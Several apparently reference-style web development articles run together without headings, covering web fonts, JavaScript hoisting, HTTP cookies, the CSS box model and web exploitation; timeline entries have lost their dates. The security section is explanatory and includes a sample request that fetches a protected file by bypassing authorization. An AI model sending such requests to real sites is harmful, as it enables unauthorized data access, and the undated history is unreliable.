Instead , it may be better to load web fonts in advance via preloading , as in ` & lt;link rel="preload " href="https://fonts.gstatic.com / s / tangerine / v11 / IurY6Y5j_oScZZow4VOxCZZM.woff2 " as="font " type="font / woff2 " crossorigin="anonymous " > ` .
By the time the font is seen in CSS , it 's already loaded .
However , preloading should be done with care .
Do n't preload all web fonts since the browser might prioritize font downloads over other downloads .
If font resources are coming from an external CDN , you might end up downloading old font files when newer ones are used in CSS .
Always set ` crossorigin="anonymous " ` to the ` & lt;link > ` tag .
If the user 's system already has the font , there 's no need to download it from the web .
This can be specified in ` @font - face ` by putting ` local('fontname ' ) ` before the font URL for the ` src ` property .
It 's also best to put ` @font - face ` rules before any ` & lt;script > ` tags .
Are there any best practices when working with web fonts ?
Set HTTP headers correctly so that the font is cached to the browser .
Avoid using localStorage or IndexDB since they have their own performance issues .
Since web fonts take up bandwidth , a good design should probably stick to just two fonts , one for the head and one for the body .
Even within each font , subset the characters and load only those characters needed for the design .
Some sites such as IcoMoon allow designers to create custom font files by picking only what you need from other fonts .
Microsoft started Core Fonts for the Web project .
This creates a pack of TrueType fonts consisting of Andalé Mono , Arial , Arial Black , Comic Sans MS , Courier New , Georgia , Impact , Times New Roman , Trebuchet MS , Verdana and Webdings .
In subsequent years , these fonts have been distributed by default on Windows and Macintosh .
Web designers can now use these fonts and have some assurance that they will be available on user systems .
However , later operating systems ( Android , Ubuntu , iOS ) and even some versions of Mac OS do n't include all the fonts .
CSS2 is released .
It includes ` @font - face ` that enables developers to link to a font file on the web that browsers can download .
Thus , web designers are no longer limited to a few fonts installed on computers or supported by browsers .
But there 's no consensus on the font format .
Netscape uses a close - source format called TrueDoc .
Microsoft uses Embedded OpenType ( EOT ) that also supports encryption .
Ultimately , licensing issues come in the way of widespread adoption of web - based fonts .
Based on JavaScript and Adobe Flash , sIFR ( Scalable Inman Flash Replacement ) has been released .
Designers can now replace text elements with Flash - based dynamic fonts .
For example , headings and menus could be styled differently .
Unlike replacing text with an image ( some users might disable images ) , the text remains visible .
If Flash is not installed on the browser , the browser falls back to a system font .
The Beta version of Safari 4 supports TrueType fonts with ` @font - face ` .
The Beta version of Firefox 3.1 supports both TrueType and OpenType .
While this enables better typography on the web , there 's continuing concern about font piracy .
Presentation of Typekit service from May 2009 .
Source : Biľak 2019 .
Small Batch , a company in San Francisco , announces the Typekit project .
It proposes a font delivery mechanism in which the font is delivered in subsets across multiple files that can only be reassembled by Typekit 's JavaScript code .
This brings protection against font piracy .
In November , Typekit was launched as a subscription - based service for designers and developers .
Meanwhile , in October 2009 , Typotheque launched a similar service and released an API in November .
W3C releases the first draft of the WOFF file format , which is a more optimized way to deliver fonts to browsers .
It basically compresses other font formats .
Traditional font formats such as TrueType , OpenType and Open Font Format can be compressed to WOFF .
It 's not an installable font format .
Rather , it can be used with ` @font - face ` CSS declaration .
The WOFF format itself was developed in 2009 .
This draft becomes a W3C Recommendation in December 2012 .
Google reports that its Google Font API currently serves 17 million requests per day , and is growing at 30 % every month .
Likewise , Typekit is seeing 400 million font views per month .
Typekit notes equal interest in commercial as well as free and open - source fonts .
However , there 's more work to be done for browser / device support for complex scripts such as Arabic .
By this year , almost every major browser will start supporting WOFF , bringing true cross - browser compatibility .
This is good news for font creators and web designers , who have started using web fonts in their web designs .
W3C releases the first working draft of WOFF 2.0 .
It offers 10 - 40 % better compression than WOFF 1.0 .
It becomes a W3C Recommendation in March 2018 .
To address the problem of Flash of Invisible Text ( FOIT ) , Jehl explores a method of embedding fonts directly within ` @font - face ` as data URIs .
This indeed mitigates the problem , but FOIT persists during a short interval when a slow device is processing the data URI .
With the new font events API , Jehl shows how FOIT can be completely eliminated .
W3C releases the first public working draft of CSS Fonts Module Level 4 .
This mentions the ` font - display ` property of ` @font - face ` .
This aims to give back control to web designers and developers .
Previously , browsers would determine how best to render text when fonts are downloaded .
Adoption of web fonts by major websites during 2012 - 2020 .
Source : Levantovsky 2020 .
W3C celebrates the 10th anniversary of the publication of the first draft of WOFF .
WOFF , and web fonts in general , have transformed the way brands communicate with their customers .
They 've literally changed the face of the web .
However , it 's also noted that in some countries , such as China , they have n't been that popular .
Reports at HTTP Archive show that on desktops the median download size of all font requests for a web page is about 128 KB .
The median number of font requests is 5 .
Similar numbers for mobile are 108 KB and 4 requests .
These numbers are for file extensions eot , ttf , woff , woff2 , or otf , or MIME types containing ` font ` .
On mobiles , 24.2 % of pages avoid FOIT by using the ` font - display ` property .
In many languages , variables and functions have to be declared upfront before they can be used later in the code .
Attempting to use them before declaration would result in an error .
In JavaScript , it 's possible to use variables and functions before they 're explicitly declared later in the code .
This feature of JavaScript is called Hoisting .
In a sense , the declarations are " hoisted " to the top of the code .
While hoisting is a useful feature , in the interest of code readability and maintenance , it 's perhaps good practice to put declarations before they 're used .
Could you illustrate hoisting with an example ?
An Example shows hoisting in a global context and function context .
Source : Agrawal 2017 .
In the code ` console.log(x ) ; var x = 1 ; ` , the variable ` x ` is used before it 's declared .
JavaScript allows this because of hoisting .
Hoisting is also possible for functions .
In the code ` add(3 , 4 ) ; function add(a , b ) { return a + b ; } ` , the function ` add ( ) ` is called before it 's declared .
Again , this is possible due to hoisting .
Hoisting can occur in any execution context .
JavaScript has three types of execution contexts : global , function , and eval .
Is hoisting moving a declaration to the top of the scope ?
The execution context has a creation and an execution phase .
Source : Adapted from McGinnis 2018 .
One common ( and incorrect ) explanation of hoisting is that the JavaScript engine moves variable and function declarations to the top of their scope .
Variable declarations are initialized with value ` undefined ` .
In reality , the JavaScript engine does n't move code to the top this way .
The correct explanation lies in understanding the execution context .
This is the environment in which the code runs .
Such an environment encapsulates ` this ` , variables , objects and functions that are accessible .
The execution context is created in two phases : the creation phase and the execution phase .
During the creation phase , memory is allocated to variables and functions in that scope .
The entire function of the body is in memory but it 's not executed .
Likewise , variables become available in memory but are not initialized .
It 's only later , during the execution phase , that initializing variables and calling of functions happen .
What can be hoisted ?
Variables and functions are hoisted .
Functions can be called earlier in the code even if their declarations happen later .
It 's interesting to note that if a variable and a function have the same name ( a practice that should be discouraged ) , variable initialization takes precedence over function declaration .
If the variable is uninitialized , function declaration takes precedence .
Function expressions are not hoisted .
Function expressions take the form ` var a = function ( ) { ... } ` .
The variable ` a ` is hoisted , which means that it 's initialized to ` undefined ` .
Thus , we ca n't make the call ` a ( ) ` since the variable is not initialized with the function object .
Similarly , arrow functions , which are of the form ` var a = ( ) = > ... ` , are not hoisted .
Class declarations are " hoisted " only in the sense that memory is allocated but not initialized with the class object .
With class expressions , the variable is hoisted but it 's initialized to ` undefined ` .
For example , ` var Square = new Polygon ( ) ; var Polygon = class { ... } ` wo n't work because ` Polygon ` is ` undefined ` .
This effectively means that we ca n't instantiate objects without putting the declaration first .
Could you share more details on hoisting variables ?
Firefox Developer Tools show hoisting of different variables .
Source : Devopedia 2020 .
JavaScript has this default behaviour where a variable initialized without a declaration is automatically declared with global scope .
This happens during the execution phase of the execution context , not during the creation phase .
Therefore , such variables are not hoisted .
Hoisting applies only to explicitly declared variables .
For example , hoisting works for ` console.log(a ) ; var a = 1 ; ` but not for ` console.log(b ) ; b = 1 ; ` .
For this reason , it 's recommended to explicitly declare variables .
Variables declared with keywords ` let ` or ` const ` are " hoisted " in the sense that memory is allocated during the creation phase of the execution context .
Thus , during the execution phase , the JavaScript engine wo n't complain that they 're undefined .
However , the engine will still throw a reference error when the code attempts to use them before they 're properly initialized .
Unlike the ` var ` keyword , ` let ` and ` const ` keywords do n't initialize variables with ` undefined ` .
The solution is , therefore , to declare before using such variables .
Hoisting is not useful for ` let ` and ` const ` .
JavaScript has been announced as a dynamic scripting language that can run within a web browser .
Two years later , a more standardized form of JavaScript , called ECMAScript , was published by ECMA International .
A video on YouTube explains JavaScript hoisting with examples .
This shows that the term " hoisting " was in use by 2010 , if not earlier .
ECMA International releases ECMAScript ® 2015 Language Specification .
This specification uses the term " hoisting " .
It 's said that prior standards did n't use the term explicitly .
Hoisting provides us a metaphor to think about execution contexts .
High - level description of how cookies work .
Source : Pixel Privacy , 2019.[(Pixel Privacy , 2019 ) ] HTTP cookies are small bits of information exchanged between client and server over the HTTP protocol .
The server sets these cookies .
The client receives and saves them locally .
Subsequently , whenever the client makes a request to the server , it includes these cookies in the request .
The server uses these cookies to provide the desired services .
Cookies are exchanged as simple strings in HTTP headers .
Each cookie is a name - value pair .
Cookies are scoped to the domain and web server path .
Clients ( formally called user agents ) are typically web browsers .
Often , cookies are persistent even when browsers are closed .
Cookies bring efficiency and convenience to the web browsing experience .
However , cookies have been misused to track users ( privacy ) or hack systems ( security ) .
These threats are being addressed by regulations and alternative technical solutions .
What 's the problem that an HTTP cookie solves ?
An HTTP cookie is set during user login and subsequently used to manage the session .
Source : Hsu 2018 .
The HTTP protocol enables client - server communication on the web .
HTTP itself is a stateless protocol .
A server does n't use information from previous requests to respond to the current request .
However , many scenarios require the server to maintain some state information about the client .
For example , a user logs into Gmail .
Subsequently , she may read emails , compose new email , add attachments or change her mail settings .
Each of these is one or more independent HTTP requests .
Without state , the server would have to authenticate the user with each request .
Instead , authentication is done once , cookies are set , and cookies are exchanged in subsequent requests to identify the authenticated user .
In other words , cookies enable stateful communication on top of stateless HTTP .
There are plenty of other examples where stateful communication is beneficial : adding items to a shopping cart on an e - commerce site , transferring money from one bank account to another , participating in an online Q&A forum , setting the language preference on a multilingual site , or searching where search engines use past queries to determine context .
What are the main uses of HTTP cookies ?
The way Google uses cookies gives us an insight into the different uses of cookies : Preferences : Remember a user 's language preference or region .
For example , this can be used to serve local weather or traffic reports .
Users can also personalize font , text size or colours .
Security : Used to authenticate users and protect user data from unauthorized access .
Processes : Used to make the site work properly for the user .
This includes navigation or protected access of certain resources .
For example , many documents can be opened in Google Docs in the same browser .
Advertising : Serve personalized ads for users .
For example , recent Google searches may be used to personalize ads .
Session State : Used to learn how users use the site , which pages are frequently visited , or measure the effectiveness of affiliate advertising .
Analytics : Collect site statistics to learn how users interact with the site , without identifying users individually .
Broadly , we can group cookies into three categories : session management ( login , shopping carts , game scores ) , personalization ( preferences , themes , settings ) , and tracking ( recording and analyzing user behaviour ) .
What are the different types of cookies ?
In terms of validity , we can identify session cookies and permanent cookies .
Session cookies are deleted once the browser is closed .
Permanent cookies persist even when the browser is closed but can be set to expire after a specified datetime .
Most permanent cookies persist for one or two years .
The browser will delete them if the user does n't visit those sites before the cookies expire .
In terms of domain , first - party cookies are cookies exchanged with the site currently being visited .
Third - party cookies are cookies exchanged with another site that 's different from the current site .
This happens because the current site uses some content from a third - party site .
While not exactly HTTP cookies , there are also Flash cookies .
These may be exchanged by sites that use Flash plugins .
They 're often called " supercookies " since users ca n't easily delete them .
Related to this are zombie cookies that recreate automatically even if deleted .
To make the web more secure , browsers will stop supporting Flash at the end of 2020 .
Could you explain the first - party and third - party cookies ?
Illustrating first - party and third - party servers / cookies .
Source : Matchett 2020 .
Suppose a user visits the site www.website.com .
This server will respond with the content .
The content may contain links to or load resources from another server .
For example , ad.doubleclick.net might provide ad services for the content publisher at www.website.com .
Thus , the user sees the site 's content plus ads from the ad server .
Cookies set by www.website.com are called first - party cookies .
Such cookies are often necessary for the correct working of the site or application .
Users typically do n't block these cookies .
Cookies set by the third - party server are called third - party cookies .
Third - party cookies can be misused since they can be used to track user behaviour across sites .
For example , if the user visits another site that also uses the same third - party ad services , the ad service now knows that the user visited both the sites .
Due to privacy concerns , some users block third - party cookies .
Third - party cookies come from ad services , social media plugins , live chat popups , etc .
In the future , such cookies may become obsolete as newer technologies replace them .
What are some essentials for HTTP cookies ?
Basic use of Set - Cookie and Cookie headers .
Source : Barth 2011a , sec .
3.1.[Barth 2011a , sec .
3.1 ] Server sets an HTTP cookie using ` Set - Cookie ` response header .
A single response can set multiple cookies but a single ` Set - Cookie ` header can set only one cookie .
A cookie is basically of the form ` name = value ` followed by zero or more attribute name - value pairs .
Pairs are separated by a semi - colon and whitespace .
When a client sends a request , applicable cookies are sent in the ` Cookie ` header .
All cookies are sent in a single ` Cookie ` header .
Cookie name - value pairs are separated by a semi - colon and whitespace .
Attribute name - value pairs are not part of the request .
The order in which the cookies appear in the header should not be significant to the server .
Attributes may contain only the name and no value .
Two attributes of this nature are ` Secure ` and ` HttpOnly ` .
On the client - side , clients should ignore unrecognized attributes but not the entire cookie .
When a client receives the same cookie as an already stored cookie ( with same domain and path attributes ) , the new cookie will replace the old one .
On the server - side , semantics are application - specific .
Could you describe the different attributes of a cookie ?
Attribute names are recognized in a case - insensitive manner .
These attributes can be optionally used for each HTTP cookie : Expires : Cookie expires at the specified datetime .
Servers can delete an existing cookie by specifying a past datetime .
Max - Age : Specifies in seconds when the cookie expires relative to the current time .
Domain : Cookie is applicable to the specified domain and its subdomains .
For example , with ` Domain = example.com ` , cookie will be sent with requests to both ` example.com ` and ` beta.example.com ` .
If absent , the cookie will be sent only to the origin server and not to subdomains .
Path : Specifies the applicable document path .
For example , with ` Path=/dashboard ` , cookie will be sent for both ` /dashboard ` and ` /dashboard / today ` but not for ` /posts ` .
For global cookie , use ` Path=/ ` .
If omitted , the path defaults to the current document location .
Secure : With this attribute , cookie is sent only over HTTPS connections .
HttpOnly : This makes the cookie inaccessible using ` document.cookie ` JavaScript API .
Only the server can edit such a cookie .
SameSite : This mitigates the risk of Cross - Site Request Forgery ( CSRF ) attacks .
In a suitable setting , the client sends the cookie only to the origin server and not to third - party servers .
Could you explain the special attribute ?
Use of the SameSite attribute prevents CSRF attacks .
Source : Garcia 2018 .
The special cookie attribute can mitigate the risk of CSRF attacks .
A typical CSRF attack is when you visit evil.com that then makes a cross - site request from your browser to your blog myblog.com to modify or even delete blog posts .
The SameSite cookie attribute takes one of three values : Strict : This is the most restrictive setting .
Third - party cookies are ignored .
While this is safe , it can also dampen the user experience .
For example , assume a user has already logged onto a site , myblog.com .
The user visits example.com where she clicks a link leading to her blog .
Since cookies are not sent , the login will not be recognized until the user refreshes the page on her blog in a first - party context .
Lax : This relaxes the restriction from Strict mode .
When the user follows the link , the browser will include the cookies .
Cookies are included only with GET requests .
None : This is the most open setting but secure attribute is mandatory .
Third - party cookies are allowed .
This means that if example.com were to request an image from myblog.com , third - party cookies would be sent , which does n't happen with Lax mode .
What are some shortcomings of HTTP cookies ?
Cookies can only contain simple strings .
They 're not suited to handling complex data structures .
Each cookie has a size limit of 4 KB .
Cookies can be edited or deleted by users on the client side .
Applications must be designed to handle this .
Cookies are not encrypted , which means that they 're not suited to handling sensitive information .
Any encryption must be provided by the application .
Cookies can also " leak " from one browser tab to the next , creating unintended effects on the application .
Since cookies are sent with every request , this has a performance impact , especially on slow mobile network connections .
The privacy concerns about cookies are well known .
Third - party cookies are widely used by ad networks and social networking sites to track users and assemble extensive profile of users in terms of behaviour and preferences .
Via social engineering , they can also be used to hack into user accounts , servers and bank accounts .
Modern solutions to avoid using cookies include Web Storage API or IndexedDB for storage ; JSON Web Tokens for token - based authentication ; and Google 's Privacy Sandbox or Storage Access API for cross - origin requests .
Fingerprinting could be used for tracking users .
Which are the standards relevant to HTTP cookies ?
The main document is IETF 's RFC 6265 titled HTTP State Management Mechanism .
This defines what 's a cookie and the Set - Cookie header fields .
It describes server - side and client - side requirements .
It also addresses implementation , privacy and security aspects .
As of October 2020 , RFC 6265bis was in draft form .
It aims to update RFC 6265 .
Among its additions are cookie prefixes ( ` Secure- ` and ` Host- ` ) and the samesite attribute .
The concept of origin is essential for cookies .
Origin is defined in RFC 6454 titled The Web Origin Concept .
Two relevant W3C Working Group Notes to look at are Tracking Preference Expression ( DNT ) and Tracking Compliance and Scope .
Cookie exchange between server and client .
Source : Montulli 1995 , fig .
4 .
Netscape Communications Corp. files a US patent titled Persistent client state in a hypertext transfer protocol based client - server system .
It says , " … when a server responds to an http request by returning an HTTP object to a client , the server may also send a piece of state information that the client system will store .
In an embodiment of the present invention , the state information is referred to as a ' cookie ' .
" Cookies are described in detail in an IETF document RFC 2109 titled HTTP State Management Mechanism .
Subsequently , this RFC is superseded by RFC 6265 ( April 2011 ) .
The European Union passed the ePrivacy Directive ( EPD ) .
This was amended in 2009 and again in 2017 at the direction of General Data Protection Regulation ( GDPR ) .
In time , EPD came to be called the Cookie Law .
The Federal Trade Commission ordered Google to pay a penalty of $ 22.5 million for placing tracking cookies in Apple 's Safari browser .
This violated a privacy agreement between the FTC and Google .
These cookies were placed by Google 's DoubleClick advertising network and bypassed Safari 's default setting of blocking third - party cookies .
Details on SameSite cookies are published in an IETF draft that aims to update RFC 6265 .
This enables servers to assert that cookies should not be sent with cross - site requests .
This mitigates the risk of cross - site request forgery ( CSRF ) attacks .
This draft later became part of RFC 6265bis draft .
Version 00 of RFC 6265bis has been published .
Version 06 of this Internet - Draft will be published in April 2020 .
When eventually approved , this would supersede RFC 6265 .
Handling of third - party cookies due to ITP .
Source : Wilander 2017 .
Intelligent Tracking Prevention ( ITP ) is released as a new WebKit feature , where WebKit is the engine used in the Safari web browser .
The ITP collects statistics about resource loads and user interactions .
Via machine learning , it classifies if a domain is likely to do cross - site tracking .
If so classified , cookies ca n't be used in third - party requests after 24 hours and are purged after 30 days .
In March 2020 , WebKit fully blocks third - party cookies .
For cross - site integration , they propose the Storage Access API as an alternative .
First approved in April 2016 , the General Data Protection Regulation ( GDPR ) came into effect .
Any cookie that can identify individuals is considered personal data .
Such cookies require a user 's explicit consent .
Simply using the site does n't imply consent .
A site should provide users with a means to withdraw consent .
User consent must be stored .
Sites must clarify the purpose of each cookie and the data it collects .
W3C publishes a working group note titled Tracking Preference Expression .
Also called Do Not Track ( DNT ) , this gives users a means to express their preference with regard to tracking .
When enabled , it 's sent as a separate header with content ` DNT:0 ` or ` DNT:1 ` .
If not enabled , servers ca n't assume users are saying yes to tracking .
The earliest draft of this note can be traced to November 2011 .
Due to the privacy concerns surrounding third - party cookies , Google is proposed a new initiative called Privacy Sandbox .
This is designed to protect user privacy while keeping content accessible on the web .
They note that simply blocking third - party cookies is not effective since fingerprinting can still be used to identify users across websites ; and unlike cookies , fingerprints ca n't be cleared .
Moreover , blocking cookies denies publishers funding via ad revenues .
Google Chrome plans to phase out third - party cookies by 2022 .
The Google Chrome browser changes the default value for attributing the samesite from None to Lax .
Cookies without the SameSite attribute will be treated as having ` SameSite = Lax ` .
This restricts the use of third - party cookies in unsafe contexts .
Mozilla made a similar change to its Firefox browser in June ( for some beta users only ) .
In May 2019 , this was proposed in an IETF draft titled Incrementally Better Cookies .
Every element has an underlying box .
Source : Rollins 2018 .
CSS is used to style HTML documents .
An important insight is that every element in web design is a rectangular box . No matter how complex the design , at the level of elements , it 's just a bunch of boxes .
The " box " is an underlying representation .
We do n't actually see a box unless the designer chooses to show its border .
Each box has width and height .
Its border may or may not be visible .
Content resides within the box .
Content may be surrounded by extra spacing .
Each box is separated from its neighbouring boxes by defined distances .
The CSS Box Model formalizes these ideas in terms of CSS properties and the values they can accept .
Understanding the box model is essential for any web designer or developer .
Browsers have built - in tools that enable developers to visualize these boxes during development and debugging .
Which are the essential elements of the CSS Box Model ?
Main elements of the CSS Box Model .
Source : Manisha 2019 .
Suppose there 's a text element ` Hello World !
` .
Let 's assume that content begins at the left edge of the box and flows to the right .
Content " Hello World !
" is placed within the box .
The box has a size defined by height and width .
These dimensions are calculated from the size of the parent element , size of the content or defined explicitly for the element .
The edge of the box is called the border .
Border can be invisible , thin ( few pixels ) or thick ( many pixels ) .
It can be a solid line , a dotted line , and so on .
It can be in a chosen colour .
If we include extra spacing within the box along its edges , this is called padding .
An element usually appears next to other elements ( parent or siblings ) .
The separation from one element to the next is defined by margin .
Border , padding and margin can all have different values for each side of the box .
Some border properties are inherited by default .
Padding and margin are not inherited by default unless declared explicitly .
How is margin different from padding ?
Illustrating the effect of border , padding and margin .
Source : Adapted from Rollins 2018 .
Margin occurs outside the box to separate elements .
Padding occurs within the box to add spacing between the box edge and content .
To put it differently , margin controls rendering of an element and its neighbours , whereas padding controls rendering of an element and its children .
Because the padding area is within the box , CSS properties applied to the box affect the padding area as well .
For example , if the element has a green background colour , the padding area will have a green background but the margin background colour is not affected .
In fact , the margin background colour will be determined by that of the parent element .
Non - zero padding increases the overall dimensions of the element .
The margin adds space outside the box .
Adding a margin is like shifting the entire box whereas adding padding is like shifting the content within the box .
Padding ca n't be negative but margin can be negative .
With a negative margin , an element can " jump out " of its parent or overlap with another element .
How is the width and height of a box determined ?
With ' box - sizing : border - box ' , box width and height stay the same .
Source : Adapted from Rollins 2018 .
The total width of an element is calculated as ` margin - right + border - right + padding - right + width + padding - left + border - left + margin - left ` , where ` width ` is the box width .
The calculation for height is similar , using top and bottom rather than right and left .
If an element has the CSS declaration ` box - sizing : border - box ; ` then the total width changes to ` margin - right + width + margin - left ` .
Padding and border sizes do n't affect total box dimensions .
The Content area shrinks .
Box width and height can be specified in CSS , for example ` width : 50 % ` and ` height : 100px ` .
Values are either absolute ( pixels , points , inches , etc ) or relative ( percentage of parents , percentage of viewport , fraction of font size , etc ) .
If width and height are not specified , they 're determined by the content .
For block elements , the width is 100 % of the parent by default .
It 's better to specify if the element size is essential to the overall layout .
If width and height are specified , but if the content requires more space than available , rendering behaviour is controlled by the ` overflow ` property , which can take values ` visible ` , ` hidden ` , ` scroll ` and ` auto ` .
How do I use ` display ` CSS property ?
Effect of inline , inline - block and block on a span element .
Source : Adapted from MDN Web Docs 2020a .
The CSS ` display ` property is important since it affects how the box is rendered .
Common values for ` display ` include : ` none ` : Element is not displayed .
Unlike ` visibility : hidden ` that hides an element but leaves an empty space , ` display : none ` leaves no empty space .
` inline ` : Element is displayed on the same line as adjacent elements .
Height and width are determined by the content and ca n't be set explicitly .
This is the default for span , a , img , em , strong , i , small , etc .
Only left and right margins are applicable .
Padding is applicable on all four sides but top and bottom padding may bleed into lines above and below .
` inline - block ` : Similar to inline but height and width can be set .
Box model properties are applicable here .
The problem of vertical bleeding seen in inline is solved with inline - block .
` block ` : Element is displayed on a separate line and takes up 100 % width of the parent .
This is the default for div , h1 , p , li , section , etc .
What are some variants of the box model ?
Illustrating different values of ' position ' property .
Source : James 2020 .
While the box model is often displayed as inline , inline - block or block , there are other variants .
A specialization of the box model is ` display : table ` .
This means block flow .
Cells flow into rows and columns .
A table box has margins but not padding .
Cells have padding but not margins .
Properties ` border - collapse ` and ` table - layout ` are applicable .
Another variation is ` display : list - item ` , equivalent to using the ` < li > ` tag .
Property ` list - style - type ` is applicable .
It 's possible to take out an element from the normal flow and put it in a separate layer .
This is achieved with property ` position ` .
Common values include ` absolute ` ( relative to closest ancestor ) , ` relative ` ( relative to itself in normal flow ) and ` fixed ` ( relative to viewport , unaffected by scrolling ) .
Such boxes do n't affect the position of other boxes .
These boxes can overlap freely .
The property ` z - index ` controls how they overlap , with larger values coming on top .
Another way to take out an element from normal flow is with ` float ` .
Common values include ` left ` , ` right ` , ` inline - start ` and ` inline - end ` .
Unlike ` position ` , boxes affect adjacent content in the flow .
For example , a box floating left will indent adjacent content to the right .
What is margin collapsing ?
Illustrating margin collapsing .
Source : Seifi 2008 .
Consider two sibling elements , each set with a margin of 20px .
With inline - block display , elements are separated by 40px since margins are additive .
However , if we change to block display , adjacent margins collapse into a single margin of 20px .
Note that padding is not subject to collapsing .
Collapsed margin size is the largest of the individual margins .
If there are negative margins involved , the collapsed margin is the most positive or the most negative margin .
When all margins are negative , it collapses to the most negative margin .
Margin collapsing happens for adjacent siblings ; when there 's no content separating parents and descendants ; for empty blocks ; and more complex scenarios when these conditions are combined .
It 's been said that margin collapsing is one of the design mistakes in CSS .
There are rules to when margins can collapse , but there are also many exceptions to the rules .
This makes it difficult and confusing for a web developer .
One way to overcome this complexity is to consistently set right and bottom margins and zero out top and left margins , such as , ` margin : 0 40px 40px 0 ; ` .
Could you share some tips for working with CSS Box Model ?
Here are some useful tips for beginners : If width is not set , it defaults to 100 % .
Padding and border will push inwards .
If width is explicitly set to 100 % , the padding and border will push outwards as normal .
Left and right margins can take the value of ` auto ` to center the element horizontally .
This is not possible with padding .
For centering vertically , use ` display : table - cell ; vertical - align : middle ; ` for the element and ` display : table ` for its parent .
The CSS Flexbox offers a simpler approach .
To inherit only the right margin and fix other margins , use ` margin : 10px 0 20px 15px ; margin - right : inherit ; ` .
Use ` box - shadow ` with ` rgba ` values to improve design quality .
To fit images to a certain width without exceeding the original width or distorting them , use ` max - width : 100 % ; height : auto ; ` .
Element height depends on content height and remains unaffected by ` height : 100 % ` .
Height can be controlled using padding , such as ` height : 0 ; padding - bottom : 100 % ; ` .
Columns with different content can be made to have the same height using large padding and negative margin .
Suppose the bottom padding is 10px , we can use ` margin - bottom : -99999px ; padding - bottom : 100009px ; ` .
The CSS Flexbox offers a simpler approach .
Which are some CSS modules that are relevant to the CSS Box Model ?
CSS Intrinsic & Extrinsic Sizing is the module that talks about ` box - sizing ` property that 's directly relevant to the box model .
This property can take values ` content - box ` ( default ) and ` border - box ` .
The box model relates to only one element .
When designing layout , the use of CSS properties ` margin ` , ` display ` and ` float ` are helpful .
However , there are CSS3 modules that work with the box model and simplify layout design : CSS Flexbox : Children of a container can adjust their sizes to fit the container .
This can happen in one dimension , either horizontally or vertically .
By nesting , two - dimensional layouts can be achieved .
CSS Grid : A two - dimensional layout system that 's easier to work with than Flexbox .
This is a modern alternative to the ` < table > ` tag from the early days of HTML .
CSS Multi - column : Content flows into multiple columns with gap and rules between columns .
Another useful module is CSS Box Alignment that works with layout modules to align elements within their container parent .
Elements can be positioned within the parent , spaces between elements can be controlled , and containers can be configured to align the elements within .
Terminology of the CSS box model in the original CSS1 specification .
Source : Lie and Bos 1996 , sec .
4.1 .
W3C publishes Cascading Style Sheets , level 1 , simply called CSS1 , to express styling of HTML documents .
It borrows from desktop publishing terminology .
It states that each formatted element is treated as a rectangular box surrounded by optional padding , border and margin areas .
Top and bottom margins can collapse .
Before IE6 , the IE box model did n't conform to the W3C box model .
Source : Wikipedia 2020a .
Microsoft releases Internet Explorer 6 , which conforms to the W3C CSS box model .
Earlier releases of IE implemented a modified box model that ignored border and padding when computing the total width or height of an element : ` total width = margin - left + width + margin - right ` .
Effectively , earlier versions of IE reduced content size to make room for border and padding .
This behaviour is possible in CSS3 via ` box - sizing : border - box ; ` .
Terminology of the CSS box model in the CSS2.1 specification .
Source : Bos et al .
2011 .
The first draft of CSS2.1 is published , which is a revision of CSS2 from 1997 .
CSS2.1 becomes a W3C Recommendation in June 2011 .
To clarify , it adds the terms border edge and padding edge .
The inner edge is also called the content edge .
The outer edge is also called the margin edge .
Unlike in CSS1 , margin , padding and border properties can be inherited .
W3C publishes the first working draft of CSS Box Model Module Level 3 .
Subsequent revisions of this draft appeared in 2007 , 2018 and 2020 .
The main change is to bring clarity to vertical writing modes .
Bowers et al .
publish the book Pro HTML5 and CSS3 Design Patterns .
They note that to speak of the box model as a single model is an oversimplification .
They identify six types of the box model : inline , inline - block , block , table , absolute and floated .
W3C publishes the first public working draft of CSS Box Model Module Level 4 .
Property ` margin - trim ` is introduced with three possible values : ` none ` , ` in - flow ` and ` all ` .
Often we include margins between siblings , but we wish to avoid margins before / after the first / last sibling since they border the parent container .
This property , when used on an element , trims the margins of children that border the container 's edges .
Websites are significantly more complex today than in the early 1990s , when they mostly served static HTML content .
Web applications often serve dynamic content , use databases , and rely on third - party web services .
The application server itself is being built from many components , which may come from diverse sources .
Servers authenticate users before logging them into the system .
They also authorize users to access restricted resources or data .
Often , applications handle sensitive user data that needs to be protected .
Given this complexity , it 's not easy to deploy and maintain web applications in a secure way .
No application is perfect .
Hackers are always on the lookout to discover and exploit vulnerabilities .
This article discusses web exploitations and offers tips to improve the security of web applications .
What aspects of an application are vulnerable to web exploitation ?
Modern web architecture is complex with many parts and interfaces .
Source : Futon 2017 .
A web application typically involves a web server , an application server , application middleware , internal or third - party web services , a database , and so on .
Any of these components could be attacked .
An attack could be as simple as slowing down the server by making lots of HTTP requests .
More serious attacks would involve installing a virus on the server or stealing sensitive data .
Defacing the site by modifying site content , or deleting code or data are just as serious but more easily visible .
Another attack is to running cryptocurrency miners on server infrastructure .
Web clients / browsers and servers communicate via protocols such as HTTP , HTTPS , FTP , etc .
Vulnerabilities in how these protocols are used could be exploited .
Protocols are located at different layers of the protocol stack .
Although web exploits happen at the application layer ( layer 7 ) , they can impact other layers via packet flooding ( data link layer ) or SYN flooding ( network layer ) .
However , web exploits at the application layer are becoming more common than network layer attacks on web servers .
Which are the main types of web vulnerabilities and their related exploits ?
Web exploits involve one or more of the following : Injection : This results from accepting untrusted input without proper validation .
Examples include SQL injection , LDAP injection and HTTP header injection .
Misconfiguration : This happens when processes are manual and settings are not correctly maintained .
Cross - Site Scripting : Via user input , the server accepts untrusted JavaScript code .
When the server returns this in response , the browser will execute it .
Outdated Software : With the increasing use of open source and third - party software packages , it 's important to keep these updated .
Outdated software can be exploited , especially when the vulnerabilities are public .
Authentication & Authorization : URL may expose session ID .
The Password may be unencrypted .
If timeouts are not correctly implemented , session hijacking is possible .
Unauthorized resources can be accessed even when the UI does n't expose them .
Direct Object References : By poor design or coding error , direct references are exposed to clients .
For example , a GET request to ` download.php?file=secret.txt ` may bypass authorization and allow direct download of a protected file .
Another example is to directly reset the admin password .
Data Exposure : Sensitive data is stored in an unencrypted form , or exposed in cookies or URLs .
Client - server communicate on a non - HTTPS connection .
What are some exploits pertaining to HTTP headers ?
With HTTP request smuggling , the frontend server sees one request while the backend server sees and requests .
Source : PortSwigger 2020c .
One technique is to send an arbitrary domain name or port number in the host header and see how the server responds .
Duplicating the host header or formatting it differently can reveal vulnerabilities .
These can be exploited to reset passwords , bypass authentication or poison web cache .
Suppose your architecture uses a load balancer or reverse proxy , followed by a backend server .
Each component might process the HTTP header in extremely different ways .
This can lead to HTTP request smuggling attacks in which an extra malicious request is smuggled via the main request .
